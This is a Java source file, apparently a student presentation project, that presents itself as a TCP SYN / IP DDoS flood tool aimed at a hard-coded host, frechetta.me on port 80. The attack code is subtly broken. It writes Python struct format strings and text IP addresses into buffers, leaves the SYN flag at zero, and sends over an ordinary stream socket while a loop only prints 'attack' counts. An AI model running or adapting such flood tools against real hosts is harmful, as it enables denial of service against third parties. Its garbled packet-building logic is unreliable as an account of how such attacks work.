/*

David Jensen, Presentation project. This program is designed to use both TCP and IP vulnerabilities
DDos flood attack, sends 200,000 TCP & IP attacks to the desired host and port.
compile and run as TcpsynIPattack.java 
pass checkstyle

*/
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.lang.Exception;
import java.net.Socket;
import java.net.SocketException;
import java.nio.ByteBuffer;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.Date;
import java.util.Scanner;



class TcpSynIpAttack {

  public static void main(String[] args) {

    //declairing both the TCP, IP and special character variables
    boolean et = true;
    int count = 0;
    int placeholder = 0;
    Socket socket = null;
    DateTimeFormatter dtf = DateTimeFormatter.ofPattern("MM/dd/yyy");
    LocalDateTime now = LocalDateTime.now();
    //long currentTime = System.currentTimeSec();
    //connect to the socket and port of the desired website
    //frechetta.me

    try {
      socket = new Socket("frechetta.me", 80); 
    } catch (Exception e) { 
      System.out.println("Error, connection failed. please try again:"); 
      System.exit(0); 
    } 
    System.out.println("Success"); 
    ByteBuffer buf = ByteBuffer.allocate(1024);
    String characters = "!BBHHHBBH4s4s";
    byte[] charactersBytes = characters.getBytes();

    buf.put(charactersBytes);
    int ipIhl = 5;
    int ipVer = 4;
    int ipIhlVer = (ipVer << 4) + ipIhl;
    buf.putInt(ipIhlVer);
    int ipTos = 0;
    buf.putInt(ipTos);
    int ipTotLen = 0; //kernel will fill the correct total lenght
    buf.putInt(ipTotLen);
    int ipId = 54321;  //ID of this packet
    buf.putInt(ipId);
    int ipFragOff = 0;
    buf.putInt(ipFragOff);
    int ipTtl = 255;
    buf.putInt(ipTtl);
    int ipProto = 6;
    buf.putInt(ipProto);
    int ipCheck = 0;    //kernel will fill the correct checksum
    buf.putInt(ipCheck);
    String sourceIp = "10.1.10.1";
    byte[] sourceIpBytes = sourceIp.getBytes();
    buf.put(sourceIpBytes);
    String destIp = "10.1.12.173";
    byte[] destinationIpBytes = destIp.getBytes();
    buf.put(destinationIpBytes);

    int size = buf.remaining();
    byte[] arr = new byte[buf.remaining()];
    buf.get(arr);

    // this is going to now push TCP
    System.out.println("IP Size is: " + size); 

    try {
      socket = new Socket("frechetta.me", 80); 
    } catch (Exception e) { 
      System.out.println("Error, connection failed. please try again:"); 
      System.exit(0); 
    } 
    System.out.println("Success"); 
    ByteBuffer newbuf = ByteBuffer.allocate(1024);
    String newCharacters = "HHLLBBHHH";
    byte[] charBytes = newCharacters.getBytes();
    
    int tcpDoff = 5;
    int tcpOffsetRes = (tcpDoff << 4);
    int tcpSyn = 0;
    int tcpFin = 0;
    int tcpUrg = 0;
    int tcpRst = 0;
    int tcpPsh = 0;
    int tcpAck = 0;
    int tcpFlags = (tcpSyn << 1) + (tcpRst << 2) + (tcpPsh << 3) 
        + (tcpAck << 4) + (tcpUrg << 5) + tcpFin;

    newbuf.put(charBytes);
    int tcpSource = 1234;
    newbuf.putInt(tcpSource);
    int tcpDest = 80;
    newbuf.putInt(tcpDest);
    int tcpSeq = 454;
    newbuf.putInt(tcpSeq);
    int tcpAckSeq = 0;
    newbuf.putInt(tcpAckSeq);
    newbuf.putInt(tcpOffsetRes);
    newbuf.putInt(tcpFlags);
    int tcpWindow = 5840;
    newbuf.putInt(tcpWindow);
    int tcpCheck = 0;
    newbuf.putInt(tcpCheck);
    int tcpUrgPtr = 0; 
    newbuf.putInt(tcpUrgPtr);
    newbuf.put(sourceIpBytes);
    newbuf.put(destinationIpBytes);

    int thisSize = newbuf.remaining();
    byte[] newArr = new byte[newbuf.remaining()];
    newbuf.get(newArr);

    System.out.println("TCP Size is: " + thisSize); 

    //after completeing the IP flood, now this is going to complete the TCP flood

    while (true) { 

      try (DataOutputStream outToServer = new DataOutputStream(socket.getOutputStream())) {

        while (et != false) {
          outToServer.write(arr, 0, size);
          outToServer.write(newArr, 0, thisSize);
          while (count != 100000) {
            System.out.println("\nTime of Attack: " + dtf.format(now) + " " 
                + java.time.LocalTime.now() + "\nDDos Attack number:" + count);
            //System.out.println("TCP sent attack number: " + newArr);

            ++ count;
          }
        }
      } catch (IOException ee) { 
        System.out.println("Attack complete: " + dtf.format(now) + " " + java.time.LocalTime.now());
      } 
      et = false;
      break;
    } 
    try { 
      socket.close(); 
    } catch (IOException ee) { 

      System.out.println("socket closed");
      System.exit(0);
    }
  }
}



